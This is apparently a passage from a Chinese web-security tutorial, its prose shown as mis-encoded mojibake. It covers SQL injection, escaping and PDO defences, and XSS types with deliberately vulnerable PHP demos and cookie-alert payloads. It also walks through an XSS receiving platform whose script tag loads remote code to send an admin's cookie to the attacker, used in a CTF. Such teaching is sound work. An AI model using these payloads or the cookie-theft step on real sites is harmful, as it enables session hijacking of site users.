å‰å°sqlæ³¨å…¥ä¸ºä¾‹ï¼Œindex.php?doc-createåˆ›å»ºè¯æ¡å¯ä»¥é€šè¿‡<code>aaaaâ€¦â€¦aa&#39;</code> 81ä¸ªå­—ç¬¦ï¼Œç»è¿‡è½¬ä¹‰å˜æˆ<code>aaaaâ€¦â€¦aa\&#39;</code>82ä¸ªå­—ç¬¦ï¼Œç»è¿‡æˆªæ–­å˜æˆ<code>aaaaâ€¦â€¦aa\</code>81ä¸ªå­—ç¬¦ï¼Œå°†sqlè¯­å¥ä¸­çš„å•å¼•å·è½¬ä¹‰ï¼Œå¹¶ä¸”åé¢ä¸€ä¸ªå‚æ•°ç”¨æˆ·å¯æ§ï¼Œäº§ç”Ÿäº†SQLæ³¨å…¥</p><p><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;</code></p><p><code>ï¼Œconcat(user(),0x7c,database(),0x7c,version()),1,1,#</code></p><h3 id="æ¼æ´é˜²èŒƒ"><a href="#æ¼æ´é˜²èŒƒ" class="headerlink" title="æ¼æ´é˜²èŒƒ"></a>æ¼æ´é˜²èŒƒ</h3><h4 id="gpc-x2F-rutimeé­”æœ¯å¼•å·"><a href="#gpc-x2F-rutimeé­”æœ¯å¼•å·" class="headerlink" title="gpc&#x2F;rutimeé­”æœ¯å¼•å·"></a>gpc&#x2F;rutimeé­”æœ¯å¼•å·</h4><ul><li>magic_quotes_gpcè´Ÿè´£å¯¹GETã€POSTã€COOKIEçš„å€¼è¿›è¡Œè¿‡æ»¤</li><li>magic_quotes_runtimeå¯¹ä»æ•°æ®åº“æˆ–è€…æ–‡ä»¶ä¸­è·å–çš„æ•°æ®è¿›è¡Œè¿‡æ»¤ã€‚ä¸Šé¢çš„äºŒæ¬¡æ³¨å…¥å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°å¯¹ç‰¹æ®Šç¬¦å·è½¬ä¹‰</li></ul><p>å¼€å¯è¿™ä¸¤ä¸ªé€‰é¡¹ä¹Ÿåªèƒ½é˜²å¾¡éƒ¨åˆ†SQLæ³¨å…¥ã€‚å› ä¸ºä»–ä»¬åªå¯¹<code>&#39;</code>ã€<code>&quot;</code>ã€<code>\</code>ã€<code>ç©ºå­—ç¬¦</code>è¿›è¡Œè½¬ä¹‰,åœ¨intå‹æ³¨å…¥ä¸Šæ²¡æœ‰å¤ªå¤§ä½œç”¨ã€‚</p><h4 id="è¿‡æ»¤å‡½æ•°å’Œç±»"><a href="#è¿‡æ»¤å‡½æ•°å’Œç±»" class="headerlink" title="è¿‡æ»¤å‡½æ•°å’Œç±»"></a>è¿‡æ»¤å‡½æ•°å’Œç±»</h4><h5 id="addslasheså‡½æ•°"><a href="#addslasheså‡½æ•°" class="headerlink" title="addslasheså‡½æ•°"></a>addslasheså‡½æ•°</h5><p>addslashesä¹Ÿæ˜¯å¯¹<code>&#39;</code>ã€<code>&quot;</code>ã€<code>\</code>ã€<code>ç©ºå­—ç¬¦</code>è¿›è¡Œè½¬ä¹‰ï¼Œå¤§å¤šæ•°ç¨‹åºä½¿ç”¨å®ƒå®åœ¨ç¨‹åºå…¥å£ï¼Œåˆ¤æ–­å¦‚æœæ²¡æœ‰æ²¡æœ‰å¼€å¯gpc,åˆ™ä½¿ç”¨å®ƒå¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤,ä¸è¿‡ä»–çš„å‚æ•°å¿…é¡»æ˜¯string,æ‰€ä»¥å¦‚æœå‚æ•°æ˜¯æ•°ç»„ç±»å‹,é‚£ä¹ˆå¿…é¡»ä½¿ç”¨æ­¤å‡½æ•°å¯¹æ•°ç»„é€’å½’è¿‡æ»¤ã€‚</p><h5 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_[real]_escape_string"></a>mysql_[real]_escape_string</h5><p>mysql_escape_stringå’Œmysql_real_escape_stringå‡½æ•°éƒ½æ˜¯å¯¹å­—ç¬¦ä¸²è¿›è¡Œè¿‡æ»¤,åœ¨php4.0.3ä»¥ä¸Šç‰ˆæœ¬æ‰æœ‰è¿™ä¸¤ä¸ªå‡½æ•°,<code>\x00</code>ã€<code>\n</code>ã€<code>\r</code>ã€<code>\</code>ã€<code>&#39;</code>ã€<code>&quot;</code>ã€<code>\x1a</code>ã€‚ä¸åŒåœ¨äºmysql_real_escape_stringæ¥å—çš„æ˜¯ä¸€ä¸ªè¿æ¥å¥æŸ„å¹¶æ ¹æ®å½“å‰å­—ç¬¦é›†è½¬ä¹‰å­—ç¬¦ä¸²,æ‰€ä»¥æœ€å¥½ä½¿ç”¨mysql_real_escape_stringã€‚</p><p>mysql_escape_string</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$item</span> = <span class="hljs-string">&quot;Zak&#x27;s Laptop&quot;</span>;<br><span class="hljs-variable">$escaped_item</span> = <span class="hljs-title function_ invoke__">mysql_escape_string</span>(<span class="hljs-variable">$item</span>);<br></code></pre></td></tr></table></figure><p>mysql_real_escape_string</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bad!&#x27;</span>);<br><span class="hljs-variable">$item</span> = <span class="hljs-string">&quot;Zak&#x27;s Laptop&quot;</span>;<br><span class="hljs-variable">$escaped_item</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$item</span>,<span class="hljs-variable">$conn</span>);<br></code></pre></td></tr></table></figure><h6 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h6><p>å°†å­—ç¬¦è½¬æ¢æˆæ•°å€¼</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-string">&#x27;1 union select&#x27;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$id</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$id</span>;<br></code></pre></td></tr></table></figure><h4 id="PDOé¢„ç¼–è¯‘æ–¹å¼"><a href="#PDOé¢„ç¼–è¯‘æ–¹å¼" class="headerlink" title="PDOé¢„ç¼–è¯‘æ–¹å¼"></a>PDOé¢„ç¼–è¯‘æ–¹å¼</h4><p>ä½¿ç”¨PDOæ–¹å¼åŸºæœ¬å¯ä»¥é˜²æ­¢sqlæ³¨å…¥,åŸå› æ˜¯å› ä¸ºæœ‰ä¸¤æ¬¡ä¼ è¾“ï¼Œå‰ä¸€æ¬¡ä¼ ä¸€ä¸ªsqlæ¨¡æ¿ï¼Œç¬¬äºŒæ¬¡ä¼ æŸ¥è¯¢å‚æ•°ï¼Œä¼šæŠŠç¬¬äºŒæ­¥ä¼ å…¥çš„å‚æ•°åªåšæŸ¥è¯¢å‚æ•°å¤„ç†ï¼Œä¸åšè¯­ä¹‰è§£é‡Šï¼Œè¿™æ ·æ³¨å…¥çš„æ¡ä»¶å°±ç®—æ‰§è¡Œäº†ï¼Œä¹Ÿä¸ä¼šå¾—åˆ°æŸ¥è¯¢ç»“æœã€‚ä½†æ˜¯è¿˜æ˜¯å­˜åœ¨ç‰¹æ®Šæƒ…å†µä¼šåœ¨ä½¿ç”¨äº†PDOæ–¹å¼ä¹Ÿä¼šå­˜åœ¨æ³¨å…¥,å¯ä»¥å‚è€ƒ<a href="https://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection/12202218#12202218">https://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection/12202218#12202218</a></p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=test&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>&#125;<br><span class="hljs-variable">$sta</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&#x27;select * from table where name = ?&#x27;</span>); <span class="hljs-comment">//å‡†å¤‡ SQL æ¨¡ç‰ˆï¼Œå…¶ä¸­ ? ä»£è¡¨ä¸€ä¸ªå‚æ•°ã€‚</span><br><span class="hljs-variable">$sta</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;name1&#x27;</span>)); <span class="hljs-comment">//é€šè¿‡æ•°ç»„è®¾ç½®å‚æ•°ï¼Œæ‰§è¡Œ SQL æ¨¡ç‰ˆ</span><br></code></pre></td></tr></table></figure><h2 id="XSSæ¼æ´"><a href="#XSSæ¼æ´" class="headerlink" title="XSSæ¼æ´"></a>XSSæ¼æ´</h2><h3 id="æˆå› ä¸å±å®³"><a href="#æˆå› ä¸å±å®³" class="headerlink" title="æˆå› ä¸å±å®³"></a>æˆå› ä¸å±å®³</h3><p>å‚æ•°æ²¡æœ‰è¢«è¿‡æ»¤æˆ–ä¸¥æ ¼è¿‡æ»¤,ä¸”å‚æ•°ä¼ å…¥åˆ°äº†è¾“å‡ºå‡½æ•°,è¢«è¾“å‡ºåˆ°äº†é¡µé¢ã€‚å¸¸å‡ºç°åœ¨æ–‡ç« å‘è¡¨ã€è¯„è®ºå›å¤ã€ç•™è¨€ã€èµ„æ–™ä¿®æ”¹ç­‰åœ°æ–¹ã€‚</p><p>å¯èƒ½äº§ç”Ÿå¦‚ä¸‹å±å®³:</p><ul><li>çªƒå–cookie</li><li>ä¿®æ”¹é¡µé¢è¿›è¡Œé’“é±¼</li><li>å‰ç«¯èƒ½åšçš„äº‹æƒ…,xsséƒ½èƒ½åšåˆ°</li></ul><h3 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h3><p>åå°„å‹ã€å­˜å‚¨å‹ã€domå‹</p><h3 id="åå°„å‹"><a href="#åå°„å‹" class="headerlink" title="åå°„å‹"></a>åå°„å‹</h3><p>ç»è¿‡äº†åç«¯,ä½†æ˜¯æ²¡æœ‰ç»è¿‡ç»è¿‡æ•°æ®åº“ã€‚</p><p>æ•°æ®æµå‘: æµè§ˆå™¨ -&gt; åç«¯ -&gt; æµè§ˆå™¨</p><p>eg:</p><p>reflectxss.php(test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">XSSåå°„æ¼”ç¤º<br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;xss&quot;</span>/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;test&quot;</span>/&gt;<br>&lt;/form&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$xss</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xss&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$xss</span>!==<span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$xss</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/reflectxss.php?xss=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E</code></p><p>æ¶æ„åˆ©ç”¨(ä»¥è·å–ç”¨æˆ·cookieä¸ºä¾‹):<br>æ¯”å¦‚<code>http://xxx.com/xxx.php?aaa=æ”»å‡»è€…ç¼–å†™çš„è·å–ç”¨æˆ·cookieçš„ä»£ç </code>å­˜åœ¨åå°„å‹xss,<br>æ”»å‡»è€…å¯ä»¥æŠŠæ„é€ å¥½çš„é“¾æ¥å‘åˆ°è®ºå›æˆ–è€…å…¶ä»–æ–¹å¼è¯±å¯¼ç”¨æˆ·ç‚¹å‡»,å¦‚æœç”¨æˆ·ç‚¹å‡»äº†é“¾æ¥,é‚£ä¹ˆç”¨æˆ·çš„cookieä¼šè¢«æ”»å‡»è€…çš„æœåŠ¡å™¨æ”¶åˆ°,æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç”¨æˆ·çš„cookieç™»é™†ç›®æ ‡ç½‘ç«™</p><h3 id="å­˜å‚¨å‹"><a href="#å­˜å‚¨å‹" class="headerlink" title="å­˜å‚¨å‹"></a>å­˜å‚¨å‹</h3><p>æ•°æ®ç»è¿‡äº†åç«¯,ç»è¿‡äº†æ•°æ®åº“ã€‚</p><p>æ•°æ®æµå‘: æµè§ˆå™¨-&gt; åç«¯-&gt; æ•°æ®åº“-&gt; åç«¯-&gt; æµè§ˆå™¨</p><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table xss (<br>    id int(10) unsigned NOT NULL AUTO_INCREMENT,<br>    payload varchar(100) NOT NULL,<br>    PRIMARY KEY (id)<br>)ENGINE=MyISAM DEFAULT CHARSET=utf8;<br></code></pre></td></tr></table></figure><p>storagexss.php(test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">\\å­˜å‚¨XSSæ¼”ç¤º<br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;xss&quot;</span>/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;test&quot;</span>/&gt;<br>&lt;/form&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xss</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;xss&#x27;</span>];<br><span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$xss</span>!==<span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;insert into xss(id,payload) values(1,&#x27;<span class="hljs-subst">$xss</span>&#x27;)&quot;</span>;<br>    <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>storagexsshow.php(test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select payload from xss&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>storagexss.php post:<code>&lt;img src=x onerror=alert(document.cookie)&gt;</code><br>è®¿é—®storagexsshow.phpä¼šå¼¹å‡ºcookie</p><p>æ¶æ„åˆ©ç”¨(ä»¥è¯„è®ºåŒºå­˜åœ¨å­˜å‚¨å‹xssä¸ºä¾‹):å‡å¦‚æŸç½‘ç«™è¯„è®ºåŒºå­˜åœ¨xsså­˜å‚¨è¡Œæ¼æ´,æ”»å‡»è€…åœ¨è¯„è®ºä¸­æ’å…¥è·å–cookieçš„ä»£ç ,å½“æ¯ä¸ªç”¨æˆ·çœ‹åˆ°æ­¤è¯„è®ºæ—¶,ä»–ä»¬çš„cookieéƒ½ä¼šè¢«å‘é€åˆ°æ”»å‡»è€…æœåŠ¡å™¨ã€‚</p><h3 id="DOMå‹"><a href="#DOMå‹" class="headerlink" title="DOMå‹"></a>DOMå‹</h3><p>æ²¡æœ‰ç»è¿‡åç«¯,åªåœ¨å‰ç«¯è§¦å‘ã€‚</p><p>æ•°æ®æµå‘æ˜¯ï¼šURLâ€“&gt;æµè§ˆå™¨ </p><p>eg:</p><p>domxss.php(test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//ç¦ç”¨é”™è¯¯æŠ¥å‘Š</span><br><span class="hljs-variable">$q</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;q&quot;</span>];<br><span class="hljs-meta">?&gt;</span><br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;q&quot;</span> id=<span class="hljs-string">&#x27;text&#x27;</span> value=<span class="hljs-string">&quot;&lt;?php echo <span class="hljs-subst">$q</span>;?&gt;&quot;</span> /&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;test&quot;</span>/&gt;<br>&lt;/form&gt;<br>&lt;div id=<span class="hljs-string">&quot;print&quot;</span>&gt;&lt;/div&gt;<br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-keyword">var</span> text = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;text&quot;</span>); <br><span class="hljs-keyword">var</span> <span class="hljs-keyword">print</span> = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;print&quot;</span>);<br><span class="hljs-keyword">print</span>.innerHTML = text.value + <span class="hljs-string">&#x27; not found&#x27;</span>; <span class="hljs-comment">// è·å– textçš„å€¼ï¼Œå¹¶ä¸”è¾“å‡ºåœ¨printå†…ã€‚è¿™é‡Œæ˜¯å¯¼è‡´xssçš„ä¸»è¦åŸå› ã€‚</span><br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/domxss.php?q=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E</code></p><p>æ¶æ„åˆ©ç”¨å’Œåå°„å‹xssç±»ä¼¼</p><h3 id="å®ä¾‹-1"><a href="#å®ä¾‹-1" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h3><p>ä»¥ESPCMS P8.18101601n å‰å°XSSä¸ºä¾‹ï¼Œé—®é¢˜ä¸»è¦ç”±äºé”™è¯¯é¡µé¢çš„æŠ¥é”™ä¿¡æ¯æœªä½œè¿‡æ»¤ï¼Œé€ æˆXSSæ¼æ´ã€‚</p><p>payload:<code>http://127.0.0.1/espcms/index.php?ac=%3C/code%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&amp;at=List&amp;tid=7</code></p><h3 id="é˜²èŒƒ"><a href="#é˜²èŒƒ" class="headerlink" title="é˜²èŒƒ"></a>é˜²èŒƒ</h3><ul><li>ç‰¹æ®Šå­—ç¬¦HTMLå®ä½“ç¼–ç </li><li>æ ‡ç­¾é»‘ç™½åå•(æ¨èç™½åå•,é»‘åå•å¯èƒ½å­˜åœ¨ä¸å¯é¢„æµ‹çš„ç»•è¿‡)</li><li>è¯·æ±‚å¤´è®¾ç½®HttpOnlyå±æ€§(cookieä¸èƒ½é€šè¿‡jsè°ƒç”¨è·å–)</li></ul><h3 id="XSS-å¹³å°ä½¿ç”¨ç®€è¦æ•™ç¨‹"><a href="#XSS-å¹³å°ä½¿ç”¨ç®€è¦æ•™ç¨‹" class="headerlink" title="XSS å¹³å°ä½¿ç”¨ç®€è¦æ•™ç¨‹"></a>XSS å¹³å°ä½¿ç”¨ç®€è¦æ•™ç¨‹</h3><h4 id="æ‰¾ä¸€ä¸ªxssæ¥æ”¶å¹³å°ï¼Œå¹¶å®Œæˆæ³¨å†Œç­‰ä¸€ç³»åˆ—æ“ä½œ"><a href="#æ‰¾ä¸€ä¸ªxssæ¥æ”¶å¹³å°ï¼Œå¹¶å®Œæˆæ³¨å†Œç­‰ä¸€ç³»åˆ—æ“ä½œ" class="headerlink" title="æ‰¾ä¸€ä¸ªxssæ¥æ”¶å¹³å°ï¼Œå¹¶å®Œæˆæ³¨å†Œç­‰ä¸€ç³»åˆ—æ“ä½œ"></a>æ‰¾ä¸€ä¸ªxssæ¥æ”¶å¹³å°ï¼Œå¹¶å®Œæˆæ³¨å†Œç­‰ä¸€ç³»åˆ—æ“ä½œ</h4><p>è¿™é‡Œä»¥ <a href="https://xsshs.cn/">https://xsshs.cn/</a> åšä¾‹å­</p><p><img src="https://s2.ax1x.com/2020/02/07/12BSxg.png" alt="12BSxg.png"></p><p>ç™»é™†å¹³å°</p><h4 id="åˆ›å»ºå’Œé…ç½®é¡¹ç›®"><a href="#åˆ›å»ºå’Œé…ç½®é¡¹ç›®" class="headerlink" title="åˆ›å»ºå’Œé…ç½®é¡¹ç›®"></a>åˆ›å»ºå’Œé…ç½®é¡¹ç›®</h4><p><img src="https://s2.ax1x.com/2020/02/07/12B9MQ.png" alt="12B9MQ.png"></p><p><img src="https://s2.ax1x.com/2020/02/07/12BCrj.png" alt="12BCrj.png"></p><p>å¡«å†™å¥½é¡¹ç›®åç§°å’Œæè¿°ï¼ˆè‡ªå®šä¹‰ï¼‰</p><p>ç„¶åè¿›è¡Œé…ç½®ï¼š</p><p><img src="https://s2.ax1x.com/2020/02/07/120Oat.png" alt="120Oat.png"></p><p>æ¯”å¦‚è¿™é‡Œæˆ‘ä»¬éœ€è¦è·å–ç®¡ç†å‘˜çš„cookieï¼Œå°±å‹¾ä¸Š<img src="https://s2.ax1x.com/2020/02/07/120LVI.png" alt="120LVI.png"></p><p>ç‚¹å‡»ä¸‹ä¸€æ­¥</p><p>å°±ä¼šè¿›å…¥åˆ°é¡¹ç›®ä»£ç ï¼Œæ³¨æ„ï¼Œä¸Šé¢çš„ä»£ç éƒ½æ˜¯å·²ç»å°è£…å¥½çš„äº†ï¼ŒåŒ…æ‹¬æ¥æ”¶urlä»€ä¹ˆçš„ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨å°±å¯ä»¥äº†ã€‚</p><h4 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h4><p><img src="https://s2.ax1x.com/2020/02/07/120I2D.png" alt="120I2D.png"></p><p>æ¯”å¦‚æˆ‘ä»¬éšä¾¿æŒ‘ä¸€ä¸ªæœ€ç®€å•çš„æ¥ä½¿ç”¨</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;sCrIpt srC=<span class="hljs-comment">//xs.sb/boJN&gt;&lt;/sCRipT&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä»¥C1CTFçš„xssé¢˜ç›®æ¥åšä¾‹å­</p><p><img src="https://s2.ax1x.com/2020/02/07/120Hrd.png" alt="120Hrd.png"></p><p>å°†ä»£ç å¤åˆ¶åˆ°ä½ è§‰å¾—å¯èƒ½ä¼šäº§ç”Ÿxssçš„åœ°æ–¹ï¼Œè¿™é‡Œç‚¹æäº¤åï¼Œä¿å­˜äº†åœ¨ä¸€ä¸ªé¡µé¢</p><p><img src="https://s2.ax1x.com/2020/02/07/1204PK.png" alt="1204PK.png"></p><p>å½“æœ‰ç”¨æˆ·ï¼ˆå¸¦cookieï¼‰è®¿é—®è¿™ä¸ªé¡µé¢çš„æ—¶å€™ï¼Œæ­¤ç”¨æˆ·çš„cookieå°±ä¼šè¢«è·å–å¹¶ä¸”å‘é€åˆ°æˆ‘ä»¬çš„å¹³å°ï¼Œä¸€èˆ¬æ¥è¯´æˆ‘ä»¬éœ€è¦adminçš„cookieã€‚è¿™é¢˜çš„é€»è¾‘æ˜¯ç›´æ¥å‘é€é¡µé¢idè®©ç®¡ç†å‘˜æ£€æŸ¥</p><p><img src="https://s2.ax1x.com/2020/02/07/120vPf.png" alt="120vPf.png"></p><p>ç„¶åå°±ç­‰ç€æ¥æ”¶å°±å¯ä»¥äº†ã€‚</p><h4 id="æ¥æ”¶"><a href="#æ¥æ”¶" class="headerlink" title="æ¥æ”¶"></a>æ¥æ”¶</h4><p>åœ¨å¹³å°é‡Œçš„é¡¹ç›®å†…å®¹é‡Œå°±å¯ä»¥æŸ¥çœ‹åˆ°xssçš„ç»“æœäº†</p><p><img src="https://s2.ax1x.com/2020/02/07/120xG8.png" alt="120xG8.png"></p><h3 id="æ”¶é›†å¸¸è§çš„XSS-payload"><a href="#æ”¶é›†å¸¸è§çš„XSS-payload" class="headerlink" title="æ”¶é›†å¸¸è§çš„XSS payload"></a>æ”¶é›†å¸¸è§çš„XSS payload</h3><p><a href="https://packetstormsecurity.com/files/112152/Cross-Site-Scripting-Payloads.html">Cross-Site-Scripting-Payloads</a></p><h2 id="æ–‡ä»¶æ“ä½œæ¼æ´"><a href="#æ–‡ä»¶æ“ä½œæ¼æ´" class="headerlink" title="æ–‡ä»¶æ“ä½œæ¼æ´"></a>æ–‡ä»¶æ“ä½œæ¼æ´</h2><p>æ€»çš„æ¥è¯´æ—¶å› ä¸ºæ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„éªŒè¯,æ“ä½œçš„æ–‡ä»¶æ˜¯å¦åœ¨å…è®¸çš„èŒƒå›´å†…ã€‚</p><p>å±å®³:</p><ul><li>å¯¼è‡´æ¶æ„æ–‡ä»¶&#x2F;ä»£ç åŒ…å«</li><li>å¯¼è‡´æ•æ„Ÿæ–‡ä»¶è¢«è¯»å–</li><li>å¯¼è‡´æ–‡ä»¶è¢«åˆ é™¤</li><li>å¯¼è‡´æ¶æ„æ–‡ä»¶ä¸Šä¼ </li></ul><h3 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h3><p>æ–‡ä»¶åŒ…å«åˆ†ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«(local file include)ã€è¿œç¨‹æ–‡ä»¶åŒ…å«(remote file include)ã€‚æ–‡ä»¶åŒ…å«å¯ä»¥å¯¼è‡´æ¶æ„ä»£ç 